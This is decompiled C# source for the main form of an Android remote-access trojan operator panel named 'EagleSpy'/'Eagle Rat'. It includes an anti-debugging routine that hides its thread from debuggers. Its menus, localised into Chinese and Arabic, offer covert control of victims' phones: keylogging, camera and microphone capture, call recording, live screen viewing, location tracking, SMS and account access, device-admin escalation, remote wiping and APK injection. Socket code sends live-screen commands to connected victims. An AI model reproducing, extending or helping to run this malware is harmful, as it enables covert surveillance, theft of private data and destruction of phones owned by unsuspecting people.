using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Text;
using System.IO;
using System.Media;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using DrakeUI.Framework;
using Guna.UI2.WinForms;
using LiveCharts.Maps;
using LiveCharts.WinForms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x02000057 RID: 87
[DesignerGenerated]
public partial class EagleSpyMain : Form
{
	// Token: 0x060003BB RID: 955
	[DllImport("user32.dll")]
	public static extern IntPtr FindWindow(string strclassName, string strWindowName);

	// Token: 0x060003BC RID: 956
	[DllImport("Kernel32.dll")]
	public static extern IntPtr OutputDebugString(string Txt);

	// Token: 0x060003BD RID: 957
	[DllImport("Ntdll.dll")]
	public static extern int NtSetInformationThread(IntPtr hThread, int ThreadInformationClass, IntPtr ThreadInformation, int ThreadInformationLength);

	// Token: 0x060003BE RID: 958
	[DllImport("Kernel32.dll")]
	public static extern IntPtr GetCurrentThread();

	// Token: 0x060003BF RID: 959 RVA: 0x000565E0 File Offset: 0x000547E0
	public static int HDB()
	{
		EagleSpyMain.MyStatus = EagleSpyMain.NtSetInformationThread(EagleSpyMain.GetCurrentThread(), 17, (IntPtr)0, 0);
		int result;
		if (EagleSpyMain.MyStatus != 0)
		{
			Interaction.MsgBox("Error : X00101", (MsgBoxStyle)EagleSpyMain.MyStatus, null);
			Debugger.Break();
			result = 0;
		}
		else
		{
			EagleSpyMain.ISDB = false;
			result = 1;
		}
		return result;
	}

	// Token: 0x060003C0 RID: 960 RVA: 0x00056630 File Offset: 0x00054830
	public void Translateme()
	{
		string language = RegistryHandler.Get_Language();
		string a = language;
		if (!(a == "CN"))
		{
			if (!(a == "AR"))
			{
				if (a == "EN")
				{
					this.ToolTips.SetToolTip(this.Home_Btn, "Home");
					this.ToolTips.SetToolTip(this.Clients_Btn, "Clients");
					this.ToolTips.SetToolTip(this.blockbtn, "Block List");
					this.ToolTips.SetToolTip(this.Connection_btn, "Connections");
					this.ToolTips.SetToolTip(this.inject_btn, "inject Apk");
					this.ToolTips.SetToolTip(this.Settings_btn, "Settings");
				}
			}
			else
			{
				this.infobox.Text = "معلومات";
				this.SentBox.Text = "الأرسال";
				this.ReciveBox.Text = "التحميل";
				this.RecentBox.Text = "جديد";
				this.infotitlepanel.Text = "الرئيسية";
				this.porttext.Watermark = "منفذ الاتصال";
				this.passtxt.Watermark = "مفتاح الاتصال";
				this.notifispanel.Text = "اخر التنبيهات";
				this.mappanel.Text = "خريطة الاتصالات";
				this.callspanel.Text = "اخر المكالمات";
				this.checksavepass.Text = Codes.Translate(this.checksavepass.Text, "en", "ar");
				this.serversbtn.Text = Codes.Translate(this.serversbtn.Text, "en", "ar");
				this.Home_Btn.Text = "الرئيسية";
				this.Clients_Btn.Text = "المستخدمين";
				this.blockbtn.Text = "قائمة الحظر";
				this.Connection_btn.Text = "قائمة الاتصالات";
				this.inject_btn.Text = "حقن تطبيق";
				this.Settings_btn.Text = "إعدادات البرنامج";
				this.activityzpanel.Text = "اخر النشاطات";
				this.ToolTips.SetToolTip(this.Home_Btn, "الرئيسية");
				this.ToolTips.SetToolTip(this.Clients_Btn, "عملاء");
				this.ToolTips.SetToolTip(this.blockbtn, "قائمة الحظر");
				this.ToolTips.SetToolTip(this.Connection_btn, "قائمة الاتصالات");
				this.ToolTips.SetToolTip(this.inject_btn, "حقن تطبيق");
				this.ToolTips.SetToolTip(this.Settings_btn, "إعدادات البرنامج");
				this.toblocktext.Watermark = Codes.Translate(this.toblocktext.Watermark, "en", "ar");
				this.searchtext.Watermark = "البحث بالاسم،البلد،العنوان، ...";
				this.notifiaisbtntop.Text = "إشعارات";
				this.studiobtn.Text = "الاستوديو";
				this.droperbtn.Text = "المثتب";
			}
		}
		else
		{
			this.infobox.Text = "信息";
			this.droperbtn.Text = "安装人员";
			this.studiobtn.Text = "工作室";
			this.SentBox.Text = "发了";
			this.ReciveBox.Text = "收到";
			this.RecentBox.Text = "最近";
			this.infotitlepanel.Text = "仪表板";
			this.activityzpanel.Text = "最新活动";
			this.notifispanel.Text = "最近的通知";
			this.mappanel.Text = "连接图";
			this.callspanel.Text = "最近通话";
			this.notifiaisbtntop.Text = "通知";
			this.Home_Btn.Text = "主页";
			this.Clients_Btn.Text = "客户";
			this.blockbtn.Text = "阻止页面";
			this.Connection_btn.Text = "连接页面";
			this.inject_btn.Text = "注入应用程序";
			this.Settings_btn.Text = "程序设置";
			this.porttext.Watermark = "连接端口";
			this.passtxt.Watermark = "连接键";
			this.checksavepass.Text = Codes.Translate(this.checksavepass.Text, "en", "zh");
			this.serversbtn.Text = Codes.Translate(this.serversbtn.Text, "en", "zh");
			this.ToolTips.SetToolTip(this.Home_Btn, "主页");
			this.ToolTips.SetToolTip(this.Clients_Btn, "客户页面");
			this.ToolTips.SetToolTip(this.blockbtn, "阻止页面");
			this.ToolTips.SetToolTip(this.Connection_btn, "连接页面");
			this.ToolTips.SetToolTip(this.inject_btn, "应用程序注入器");
			this.ToolTips.SetToolTip(this.Settings_btn, "程序设置");
			this.toblocktext.Watermark = Codes.Translate(this.toblocktext.Watermark, "en", "zh");
			this.searchtext.Watermark = "按名称、国家、地址搜索";
		}
		string language2 = RegistryHandler.Get_Language();
		if (Operators.CompareString(language2, "AR", false) != 0)
		{
			if (Operators.CompareString(language2, "CN", false) == 0)
			{
				this.FWctx.Items[0].Text = "允许";
				this.FWctx.Items[1].Text = "禁止";
				this.FWctx.Items[2].Text = "添加到轨道";
				this.TRKctx.Items[0].Text = "添加应用程序";
				this.TRKctx.Items[1].Text = "截图";
				this.TRKctx.Items[2].Text = "记录";
				this.TRKctx.Items[3].Text = "删除截图";
				this.TRKctx.Items[4].Text = "删除记录";
				this.TRKctx.Items[5].Text = "停止追踪";
				this.ctxmenu.Items[0].Text = "管理";
				ToolStripMenuItem toolStripMenuItem = (ToolStripMenuItem)this.ctxmenu.Items[0];
				toolStripMenuItem.DropDownItems[0].Text = "文件   ";
				toolStripMenuItem.DropDownItems[1].Text = "短信";
				toolStripMenuItem.DropDownItems[2].Text = "来电";
				toolStripMenuItem.DropDownItems[3].Text = "往来";
				toolStripMenuItem.DropDownItems[4].Text = "帐户";
				toolStripMenuItem.DropDownItems[5].Text = "应用";
				toolStripMenuItem.DropDownItems[6].Text = "权限";
				this.ctxmenu.Items[2].Text = "监控";
				ToolStripMenuItem toolStripMenuItem2 = (ToolStripMenuItem)this.ctxmenu.Items[2];
				toolStripMenuItem2.DropDownItems[0].Text = "手机屏幕";
				toolStripMenuItem2.DropDownItems[1].Text = "屏幕阅读器 2";
				toolStripMenuItem2.DropDownItems[2].Text = "相机";
				toolStripMenuItem2.DropDownItems[3].Text = "麦克风";
				toolStripMenuItem2.DropDownItems[4].Text = "键盘记录器";
				toolStripMenuItem2.DropDownItems[5].Text = "地点";
				toolStripMenuItem2.DropDownItems[6].Text = "浏览器";
				toolStripMenuItem2.DropDownItems[7].Text = "通话记录器";
				toolStripMenuItem2.DropDownItems[8].Text = "自动答题器";
				toolStripMenuItem2.DropDownItems[9].Text = "屏幕阅读器";
				this.ctxmenu.Items[4].Text = "行政";
				ToolStripMenuItem toolStripMenuItem3 = (ToolStripMenuItem)this.ctxmenu.Items[4];
				toolStripMenuItem3.DropDownItems[0].Text = "请求管理员权限";
				toolStripMenuItem3.DropDownItems[1].Text = "锁屏";
				toolStripMenuItem3.DropDownItems[2].Text = "擦除手机数据";
				this.ctxmenu.Items[6].Text = "工具";
				ToolStripMenuItem toolStripMenuItem4 = (ToolStripMenuItem)this.ctxmenu.Items[6];
				toolStripMenuItem4.DropDownItems[0].Text = "电话号码";
				toolStripMenuItem4.DropDownItems[1].Text = "安装软件";
				toolStripMenuItem4.DropDownItems[2].Text = "发送通知";
				toolStripMenuItem4.DropDownItems[3].Text = "剪贴板";
				toolStripMenuItem4.DropDownItems[4].Text = "打开链接";
				toolStripMenuItem4.DropDownItems[5].Text = "终端";
				this.ctxmenu.Items[8].Text = "额外的";
				ToolStripMenuItem toolStripMenuItem5 = (ToolStripMenuItem)this.ctxmenu.Items[8];
				toolStripMenuItem5.DropDownItems[0].Text = "通知";
				toolStripMenuItem5.DropDownItems[1].Text = "通话活动";
				toolStripMenuItem5.DropDownItems[2].Text = "电话信息";
				this.ctxmenu.Items[10].Text = "联系";
				ToolStripMenuItem toolStripMenuItem6 = (ToolStripMenuItem)this.ctxmenu.Items[10];
				toolStripMenuItem6.DropDownItems[0].Text = "重新连接";
				toolStripMenuItem6.DropDownItems[1].Text = "堵塞";
				toolStripMenuItem6.DropDownItems[2].Text = "禁用反删除";
				toolStripMenuItem6.DropDownItems[3].Text = "自行删除";
				this.ctxmenu.Items[12].Text = "键盘 (beta)";
				this.ctxmenu.Items[14].Text = "客户文件夹";
			}
		}
		else
		{
			this.ctxmenu.Items[0].Text = "إدارة";
			ToolStripMenuItem toolStripMenuItem7 = (ToolStripMenuItem)this.ctxmenu.Items[0];
			toolStripMenuItem7.DropDownItems[0].Text = "الملفات";
			toolStripMenuItem7.DropDownItems[1].Text = "الرسائل";
			toolStripMenuItem7.DropDownItems[2].Text = "المكالمات";
			toolStripMenuItem7.DropDownItems[3].Text = "الأسماء";
			toolStripMenuItem7.DropDownItems[4].Text = "الحسابات";
			toolStripMenuItem7.DropDownItems[5].Text = "التطبيقات";
			toolStripMenuItem7.DropDownItems[6].Text = "الصلاحيات";
			this.ctxmenu.Items[2].Text = "مراقبة";
			ToolStripMenuItem toolStripMenuItem8 = (ToolStripMenuItem)this.ctxmenu.Items[2];
			toolStripMenuItem8.DropDownItems[0].Text = "شاشة الهاتف";
			toolStripMenuItem8.DropDownItems[1].Text = "قراءة الشاشة 2";
			toolStripMenuItem8.DropDownItems[2].Text = "الكاميرا";
			toolStripMenuItem8.DropDownItems[3].Text = "الميكروفون";
			toolStripMenuItem8.DropDownItems[4].Text = "مسجل المفاتيح";
			toolStripMenuItem8.DropDownItems[5].Text = "الموقع";
			toolStripMenuItem8.DropDownItems[6].Text = "المتصفح";
			toolStripMenuItem8.DropDownItems[7].Text = "مسجل المكالمات";
			toolStripMenuItem8.DropDownItems[8].Text = "شاشة المس";
			toolStripMenuItem8.DropDownItems[9].Text = "قراءة الشاشة";
			this.ctxmenu.Items[4].Text = "مسؤول";
			ToolStripMenuItem toolStripMenuItem9 = (ToolStripMenuItem)this.ctxmenu.Items[4];
			toolStripMenuItem9.DropDownItems[0].Text = "تفعيل مسؤول الجهاز";
			toolStripMenuItem9.DropDownItems[1].Text = "قفل الهاتف";
			toolStripMenuItem9.DropDownItems[2].Text = "حذف ملفات الهاتف";
			this.ctxmenu.Items[6].Text = "أدواة";
			ToolStripMenuItem toolStripMenuItem10 = (ToolStripMenuItem)this.ctxmenu.Items[6];
			toolStripMenuItem10.DropDownItems[0].Text = "إجراء إتصال";
			toolStripMenuItem10.DropDownItems[1].Text = "تثبيت تطبيق";
			toolStripMenuItem10.DropDownItems[2].Text = "إرسال تنبيه";
			toolStripMenuItem10.DropDownItems[3].Text = "الحافظة";
			toolStripMenuItem10.DropDownItems[4].Text = "فتح موقع";
			toolStripMenuItem10.DropDownItems[5].Text = "موجه الأوامر";
			this.ctxmenu.Items[8].Text = "المزيد";
			ToolStripMenuItem toolStripMenuItem11 = (ToolStripMenuItem)this.ctxmenu.Items[8];
			toolStripMenuItem11.DropDownItems[0].Text = "إشعارات الهاتف";
			toolStripMenuItem11.DropDownItems[1].Text = "المكالمات الحالية";
			toolStripMenuItem11.DropDownItems[2].Text = "معلومات الهاتف";
			this.ctxmenu.Items[10].Text = "الإتصال";
			ToolStripMenuItem toolStripMenuItem12 = (ToolStripMenuItem)this.ctxmenu.Items[10];
			toolStripMenuItem12.DropDownItems[0].Text = "إعادة الأتصال";
			toolStripMenuItem12.DropDownItems[1].Text = "حظر المستخدم";
			toolStripMenuItem12.DropDownItems[2].Text = "إيقاف منع الحذف";
			toolStripMenuItem12.DropDownItems[3].Text = "حذف التطبيق";
			this.ctxmenu.Items[12].Text = "لوحة المفاتيح (beta)";
			this.ctxmenu.Items[14].Text = "ملفات المستخدم";
			this.TRKctx.Items[0].Text = "إضافة تطبيق";
			this.TRKctx.Items[1].Text = "لقطات الشاشة";
			this.TRKctx.Items[2].Text = "السجلات";
			this.TRKctx.Items[3].Text = "حذف  لقطات الشاشة";
			this.TRKctx.Items[4].Text = "حذف السجلات";
			this.TRKctx.Items[5].Text = "إيقاف التتبع";
			this.FWctx.Items[0].Text = "السماح";
			this.FWctx.Items[1].Text = "حظر";
			this.FWctx.Items[2].Text = "اضافة للتعقب";
		}
	}

	// Token: 0x060003C1 RID: 961 RVA: 0x0005766C File Offset: 0x0005586C
	public void Newinstance()
	{
		this.InitializeComponent();
		RegistryHandler.iniliz();
		if (Conversions.ToBoolean(Operators.NotObject(Codes.inializeReg())))
		{
			Interaction.MsgBox("Error Reg Config", MsgBoxStyle.OkOnly, null);
			Environment.Exit(0);
		}
		if (RegistryHandler.Get_Language() == null)
		{
			LanguageSelector languageSelector = new LanguageSelector();
			languageSelector.ShowDialog();
			string selectedLang = languageSelector.SelectedLang;
			string a = selectedLang;
			if (!(a == "CN"))
			{
				if (!(a == "EN"))
				{
					if (!(a == "AR"))
					{
						RegistryHandler.Set_Language("EN");
					}
					else
					{
						RegistryHandler.Set_Language("AR");
					}
				}
				else
				{
					RegistryHandler.Set_Language("EN");
				}
			}
			else
			{
				RegistryHandler.Set_Language("CN");
			}
		}
		this.Translateme();
		this.SCANER = new clsComputerInfo();
		Data.MainForm = this;
	}

	// Token: 0x060003C2 RID: 962 RVA: 0x00057738 File Offset: 0x00055938
	public EagleSpyMain()
	{
		base.Load += this.CraxsRatMain_Load;
		base.Closing += this.AngelAndroidForm_Closing;
		base.FormClosing += this.AngelAndroidForm_FormClosing;
		base.Deactivate += this.CypherRat_Deactivate;
		base.Activated += this.CypherRat_Activated;
		this.PORTs = "";
		this.server = new List<Accept>();
		this.Myname = "Eagle Rat";
		this.Alive = true;
		this.DKF = "";
		this.DKD = "BRTHRRTBSA";
		this.GlobalMap = new GeoMap();
		this.Globalvlues = null;
		this.NumWorkers = 0;
		this.SCANER = null;
		this.isactive = true;
		this.searchbefore = new List<DataGridViewRow>();
		this.Newinstance();
	}

	// Token: 0x060003C3 RID: 963 RVA: 0x000029BC File Offset: 0x00000BBC
	private void NotifyI()
	{
		this.notfi.Visible = true;
	}

	// Token: 0x060003C4 RID: 964 RVA: 0x00057820 File Offset: 0x00055A20
	private void TOpacity_Tick(object sender, EventArgs e)
	{
		if (base.Opacity != 1.0)
		{
			base.Opacity += 0.1;
		}
		else
		{
			this.TOpacity.Enabled = false;
		}
	}

	// Token: 0x060003C5 RID: 965 RVA: 0x00057868 File Offset: 0x00055A68
	private void Countryclickhandelr(object arg1, MapData arg2)
	{
		Point position = Cursor.Position;
		checked
		{
			position.Y += (int)Math.Round(unchecked((double)this.Cursor.Size.Height * 1.5));
			this.ToolTips.Show(arg2.Name, this, base.PointToClient(position), 3000);
		}
	}

	// Token: 0x060003C6 RID: 966 RVA: 0x000578D0 File Offset: 0x00055AD0
	[DebuggerStepThrough]
	private void CraxsRatMain_Load(object sender, EventArgs e)
	{
		EagleSpyMain.VB_0024StateMachine_28_CraxsRatMain_Load vb_0024StateMachine_28_CraxsRatMain_Load = new EagleSpyMain.VB_0024StateMachine_28_CraxsRatMain_Load();
		vb_0024StateMachine_28_CraxsRatMain_Load._0024VB_0024Me = this;
		vb_0024StateMachine_28_CraxsRatMain_Load._0024VB_0024Local_sender = sender;
		vb_0024StateMachine_28_CraxsRatMain_Load._0024VB_0024Local_e = e;
		vb_0024StateMachine_28_CraxsRatMain_Load._0024State = -1;
		vb_0024StateMachine_28_CraxsRatMain_Load._0024Builder = AsyncVoidMethodBuilder.Create();
		vb_0024StateMachine_28_CraxsRatMain_Load._0024Builder.Start<EagleSpyMain.VB_0024StateMachine_28_CraxsRatMain_Load>(ref vb_0024StateMachine_28_CraxsRatMain_Load);
		this.soundPlayer = new SoundPlayer();
		string path = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "res/Audio");
		string soundLocation = Path.Combine(path, "eagle.wav");
		this.soundPlayer.SoundLocation = soundLocation;
		this.soundPlayer.Play();
		this.cpuCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total");
		this.licenseCheckTimer = new System.Windows.Forms.Timer();
		this.licenseCheckTimer.Interval = 60000;
		this.licenseCheckTimer.Tick += this.LicenseCheckTimer_Tick;
		this.licenseCheckTimer.Start();
		this.LoadTextBoxValues();
	}

	// Token: 0x060003C7 RID: 967 RVA: 0x000579BC File Offset: 0x00055BBC
	private void SizeDGV(DataGridView dgv)
	{
		dgv.ScrollBars = ScrollBars.None;
		checked
		{
			int num = dgv.Rows.GetRowsHeight(DataGridViewElementStates.None) + dgv.ColumnHeadersHeight;
			num += dgv.Rows.Count * 4;
			int width = dgv.Columns.GetColumnsWidth(DataGridViewElementStates.None) + dgv.RowHeadersWidth;
			dgv.ClientSize = new Size(width, num);
		}
	}

	// Token: 0x060003C8 RID: 968 RVA: 0x00057A18 File Offset: 0x00055C18
	public string GetExceptionInfo(Exception ex)
	{
		this.AlertButton.Text = "Something Error";
		return this.AlertButton.Text;
	}

	// Token: 0x060003C9 RID: 969 RVA: 0x000029CA File Offset: 0x00000BCA
	private void AngelAndroidForm_Closing(object sender, CancelEventArgs e)
	{
		this.FormEventArgsClosing();
	}

	// Token: 0x060003CA RID: 970 RVA: 0x00057A44 File Offset: 0x00055C44
	public void FormEventArgsClosing()
	{
		try
		{
			this.notfi.Visible = false;
			this.Statustimer.Stop();
			this.monitortimer.Stop();
			if (this.checksavepass.Checked)
			{
				MySettingsProperty.Settings.savepass = true;
				MySettingsProperty.Settings.Save();
			}
			else
			{
				MySettingsProperty.Settings.savepass = false;
				MySettingsProperty.Settings.Save();
			}
		}
		catch (Exception)
		{
		}
		checked
		{
			try
			{
				this.Alive = false;
				Thread.Sleep(5);
				if (this.server != null)
				{
					int num = this.server.Count - 1;
					for (int num2 = 0; num2 <= num; num2++)
					{
						try
						{
							this.server[num2].MainListner.Stop();
							this.server[num2].MainListner.Server.Close();
						}
						catch (Exception)
						{
						}
					}
				}
			}
			catch (Exception)
			{
			}
			try
			{
				this.PORTs = "";
				foreach (object obj in ((IEnumerable)this.DGVSERVS.Rows))
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					ref string ptr = ref this.PORTs;
					ptr = ptr + dataGridViewRow.Cells[1].Value.ToString() + ">";
				}
				MySettingsProperty.Settings.ports = this.PORTs;
				MySettingsProperty.Settings.Save();
			}
			catch (Exception)
			{
			}
			Application.ExitThread();
			Environment.Exit(0);
		}
	}

	// Token: 0x060003CB RID: 971 RVA: 0x00057C10 File Offset: 0x00055E10
	public void notfi_MouseClick(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Left)
		{
			if (base.WindowState > FormWindowState.Normal)
			{
				base.WindowState = FormWindowState.Normal;
			}
			base.TopMost = true;
			base.TopMost = false;
		}
	}

	// Token: 0x060003CC RID: 972 RVA: 0x00057C4C File Offset: 0x00055E4C
	private void BuildToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (this.B == null)
		{
			this.B = new Build();
			DialogResult dialogResult = this.B.ShowDialog(this);
			if (dialogResult != DialogResult.OK)
			{
				this.B.Close();
				this.B = null;
			}
			else
			{
				this.B.Close();
				this.B = null;
			}
		}
	}

	// Token: 0x060003CD RID: 973 RVA: 0x000029CA File Offset: 0x00000BCA
	private void ExitToolStripMenuItem_Click(object sender, EventArgs e)
	{
		this.FormEventArgsClosing();
	}

	// Token: 0x060003CE RID: 974 RVA: 0x00057CAC File Offset: 0x00055EAC
	public void StartWorkercheck()
	{
		this.NumWorkers = Operators.AddObject(this.NumWorkers, 1);
		this.Workers = new BackgroundWorker[checked(Conversions.ToInteger(this.NumWorkers) + 1)];
		this.Workers[Conversions.ToInteger(this.NumWorkers)] = new BackgroundWorker();
		this.Workers[Conversions.ToInteger(this.NumWorkers)].WorkerReportsProgress = true;
		this.Workers[Conversions.ToInteger(this.NumWorkers)].WorkerSupportsCancellation = true;
		this.Workers[Conversions.ToInteger(this.NumWorkers)].DoWork += this.myworker;
		this.Workers[Conversions.ToInteger(this.NumWorkers)].RunWorkerAsync();
	}

	// Token: 0x060003CF RID: 975 RVA: 0x000029D2 File Offset: 0x00000BD2
	private void myworker(object sender, DoWorkEventArgs e)
	{
		Thread.Sleep(1000);
		this.PortsManager.opebbtn(new object[]
		{
			""
		});
	}

	// Token: 0x060003D0 RID: 976 RVA: 0x00057D6C File Offset: 0x00055F6C
	public void addLog(object[] objs)
	{
		if (this.DataLog.InvokeRequired)
		{
			EagleSpyMain.addLogback method = new EagleSpyMain.addLogback(this.addLog);
			this.DataLog.Invoke(method, new object[]
			{
				objs
			});
		}
		else
		{
			Image image = (Image)objs[0];
			string text = Conversions.ToString(objs[1]);
			string text2 = Conversions.ToString(objs[2]);
			string text3 = Conversions.ToString(objs[3]);
			this.DataLog.Rows.Add(new object[]
			{
				image,
				text,
				text2,
				text3,
				DateAndTime.Now.ToShortTimeString().ToString()
			});
			if (this.checkclearlogs.Checked && this.DataLog.Rows.Count > 20)
			{
				this.DataLog.Rows.Clear();
			}
		}
	}

	// Token: 0x060003D1 RID: 977 RVA: 0x00057E4C File Offset: 0x0005604C
	public void LogNotifi(object[] objs)
	{
		if (this.DGVNOTF.InvokeRequired)
		{
			EagleSpyMain.deleNotifidgv method = new EagleSpyMain.deleNotifidgv(this.LogNotifi);
			this.DGVNOTF.Invoke(method, new object[]
			{
				objs
			});
		}
		else
		{
			Image image = (Image)objs[0];
			string text = Conversions.ToString(objs[1]);
			if (this.DGVNOTF.Rows.Count >= 100)
			{
				this.DGVNOTF.Rows.Remove(this.DGVNOTF.Rows[0]);
			}
			this.DGVNOTF.Rows.Add(new object[]
			{
				image,
				text
			});
		}
	}

	// Token: 0x060003D2 RID: 978 RVA: 0x00057EF8 File Offset: 0x000560F8
	public void LogCalls(object[] objs)
	{
		if (this.DGVCALLS.InvokeRequired)
		{
			EagleSpyMain.delecallsidgv method = new EagleSpyMain.delecallsidgv(this.LogCalls);
			this.DGVCALLS.Invoke(method, new object[]
			{
				objs
			});
		}
		else
		{
			Image image = (Image)objs[0];
			string text = Conversions.ToString(objs[1]);
			if (this.DGVCALLS.Rows.Count >= 100)
			{
				this.DGVCALLS.Rows.Remove(this.DGVCALLS.Rows[0]);
			}
			this.DGVCALLS.Rows.Add(new object[]
			{
				image,
				text
			});
		}
	}

	// Token: 0x060003D3 RID: 979 RVA: 0x00057FA4 File Offset: 0x000561A4
	public void Logalert(object[] objs)
	{
		if (this.DGVALRTS.InvokeRequired)
		{
			EagleSpyMain.delealertsidgv method = new EagleSpyMain.delealertsidgv(this.Logalert);
			this.DGVALRTS.Invoke(method, new object[]
			{
				objs
			});
		}
		else
		{
			Image image = (Image)objs[0];
			string text = Conversions.ToString(objs[1]);
			if (this.DGVALRTS.Rows.Count >= 100)
			{
				this.DGVALRTS.Rows.Remove(this.DGVALRTS.Rows[0]);
			}
			this.DGVALRTS.Rows.Add(new object[]
			{
				image,
				text
			});
		}
	}

	// Token: 0x060003D4 RID: 980 RVA: 0x00058050 File Offset: 0x00056250
	public void UpdateForms(Client TargetClient)
	{
		foreach (object obj in Application.OpenForms)
		{
			Form form = (Form)obj;
			try
			{
				if (form != null && form.Tag != null)
				{
					CameraManager cameraManager = new CameraManager();
					if (Operators.CompareString(form.Tag.ToString(), "Cam_" + TargetClient.UUID, false) == 0)
					{
						cameraManager = (CameraManager)form;
						cameraManager.Name = "Camera_Manager_" + TargetClient.ClientRemoteAddress;
						cameraManager.Tag = "Cam_" + TargetClient.UUID;
						if (Operators.CompareString(cameraManager.CamerID, "null", false) != 0)
						{
							cameraManager.classClient = TargetClient;
							cameraManager.Client = TargetClient.myClient;
							cameraManager.Title = string.Format("{0} - IP:{1}", "Camera Manager", TargetClient.ClientAddressIP);
							cameraManager.Selected(cameraManager.CamerID);
							cameraManager.statustext.Text = "Reconnecting....";
							cameraManager.CAM0.Image = Resources.loading_please_wait;
						}
						else
						{
							cameraManager.classClient = TargetClient;
							cameraManager.Title = string.Format("{0} - IP:{1}", "Camera Manager", TargetClient.ClientAddressIP);
							cameraManager.Text = string.Format("{0} - IP:{1}", "Camera Manager", TargetClient.ClientAddressIP);
							if (cameraManager.classClient != null)
							{
								reso.Directory_Exist(cameraManager.classClient);
								cameraManager.tmpFolderUSER = TargetClient.FolderUSER;
							}
							cameraManager.Client = cameraManager.classClient.myClient;
							cameraManager.classCamera = TargetClient;
							cameraManager.TempImage = new PictureBox();
						}
					}
				}
			}
			catch (Exception)
			{
			}
			try
			{
				if (form != null && form.Tag != null && Operators.CompareString(form.Tag.ToString(), "screen_" + TargetClient.UUID, false) == 0)
				{
					ScreenShoter screenShoter = (ScreenShoter)form;
					if (screenShoter != null)
					{
						if (screenShoter.LIVE)
						{
							string[] array = TargetClient.Keys.Split(new char[]
							{
								':'
							});
							object[] parametersObjects = new object[]
							{
								TargetClient.myClient,
								string.Concat(new string[]
								{
									SecurityKey.KeysClient2,
									Data.SPL_SOCKET,
									"sc:on:",
									screenShoter.Qualtibox.Text,
									"~",
									screenShoter.FPSBOX.Text,
									"~",
									TargetClient.ClientRemoteAddress,
									Data.SPL_SOCKET,
									array[0],
									Data.SPL_SOCKET,
									array[1],
									Data.SPL_SOCKET,
									SecurityKey.Lockscreen,
									Data.SPL_SOCKET,
									"0",
									Data.SPL_SOCKET,
									Conversions.ToString(0),
									Data.SPL_SOCKET,
									Data.SPL_ARRAY,
									Data.SPL_SOCKET,
									TargetClient.ClientRemoteAddress
								}),
								Codes.Encoding().GetBytes("null"),
								TargetClient
							};
							TargetClient.SendMessage(parametersObjects);
							screenShoter.toptitle.Text = "Reconnecting , Please Wait...";
							screenShoter.Livepicbox.Image = Resources.loading_please_wait;
							screenShoter.StartButton.Enabled = false;
							screenShoter.StopButton.Enabled = true;
							screenShoter.vewpnl.Enabled = true;
							screenShoter.Livepicbox.Enabled = true;
							screenShoter.LIVE = true;
							screenShoter.refreshtimer.Enabled = true;
							screenShoter.refreshtimer.Start();
						}
						else
						{
							string name = "Live_Screen_" + TargetClient.ClientRemoteAddress;
							screenShoter.Name = name;
							screenShoter.Title = string.Format("{0} - IP:{1}", "Live Screen", TargetClient.ClientAddressIP);
							screenShoter.Tag = TargetClient.ClientAddressIP;
							screenShoter.classClient = TargetClient;
							screenShoter.Client = TargetClient.myClient;
							screenShoter.toptitle.Text = "Client Ready...";
							screenShoter.DownloadsFolder = TargetClient.FolderUSER;
							screenShoter.Livepicbox.Image = null;
							screenShoter.Tag = "screen_" + TargetClient.UUID;
						}
					}
				}
			}
			catch (Exception)
			{
			}
			try
			{
				if (form != null && form.Tag != null && Operators.CompareString(form.Tag.ToString(), "File" + TargetClient.UUID, false) == 0)
				{
					FileManager fileManager = (FileManager)form;
					fileManager.Tag = "File" + TargetClient.UUID;
					fileManager.Name = "File_Manager_File" + TargetClient.UUID;
					fileManager.Title = string.Format("{0} - ID:{1}", "File Manager", TargetClient.UUID);
					fileManager.Text = string.Format("{0} - ID:{1}", "File Manager", TargetClient.UUID);
					fileManager.Client = TargetClient.myClient;
					fileManager.classClient = TargetClient;
					fileManager.ver = TargetClient.VersionClient;
					fileManager.DGV0.AutoGenerateColumns = false;
					fileManager.DGV0.Columns[5].DisplayIndex = 0;
					fileManager.viwimage.Image = null;
					break;
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060003D5 RID: 981 RVA: 0x00058608 File Offset: 0x00056808
	public void Addnewrow(object[] objs)
	{
		if (this.ClientsWindow.InvokeRequired)
		{
			EagleSpyMain.deleaddnewrow method = new EagleSpyMain.deleaddnewrow(this.Addnewrow);
			this.ClientsWindow.Invoke(method, new object[]
			{
				objs
			});
		}
		else
		{
			try
			{
				Client client = (Client)objs[0];
				Dictionary<string, Client> clientRowIndices = Data._clientRowIndices;
				lock (clientRowIndices)
				{
					if (Data._clientRowIndices.ContainsKey(client.UUID))
					{
						try
						{
							Client client2 = Data._clientRowIndices[client.UUID];
							int index = Data._clientRowIndices[client.UUID].Row.Index;
							client.Keys.Split(new char[]
							{
								':'
							});
							this.ClientsWindow.Rows[index].Cells[0].Value = reso.GetScreen(client.Screen);
							this.ClientsWindow.Rows[index].Cells[1].Value = client.Wallpaper;
							this.ClientsWindow.Rows[index].Cells[2].Value = client.Flag;
							this.ClientsWindow.Rows[index].Cells[3].Value = client.ClientName;
							this.ClientsWindow.Rows[index].Cells[4].Value = client.Country;
							this.ClientsWindow.Rows[index].Cells[5].Value = client.android;
							this.ClientsWindow.Rows[index].Cells[6].Value = client.Phone_model;
							this.ClientsWindow.Rows[index].Cells[7].Value = client.Statistics;
							this.ClientsWindow.Rows[index].Tag = client.UUID;
							this.ClientsWindow.Rows[index].Cells[8].Tag = client;
							this.ClientsWindow.Rows[index].Cells[6].Tag = client.UUID;
							this.ClientsWindow.Rows[index].Cells[2].Tag = client.UUID;
							client.Row = client2.Row;
							client.Statistics = "Reset";
							this.ClientsWindow.Rows[index].Cells[7].Style.ForeColor = Color.Lime;
						}
						catch (Exception)
						{
						}
						Data._clientRowIndices[client.UUID] = client;
					}
					else
					{
						string[] array = client.Keys.Split(new char[]
						{
							':'
						});
						int index2 = this.ClientsWindow.Rows.Add(new object[]
						{
							reso.GetScreen(client.Screen),
							client.Wallpaper,
